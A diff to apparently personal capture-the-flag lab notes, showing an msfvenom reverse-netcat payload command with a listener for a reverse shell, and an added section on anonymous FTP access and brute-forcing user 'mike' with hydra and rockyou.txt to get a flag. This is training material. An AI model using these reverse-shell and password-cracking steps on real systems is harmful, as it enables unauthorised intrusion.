@@ -39,3 +39,17 @@ msfvenom -p cmd/unix/reverse_netcat lhost=*IP* lport=4444 R
 
 and run nc -lvnp 4444
 and run the payload on the target machine to recieve a reverse shell which gives us our flag
+
+--------------------------------
+
+FTP Enumeration
+
+10.10.58.99
+
+ftp enabled, anonymous login enabled and file 'PUBLIC_NOTICE.txt' in dir
+
+we have a username mike, then using hydra with rockyou.txt, we get the password 'password'
+
+logging into the ftp server with user 'mike' and password 'password', we get the flag in ftp.txt
+
+
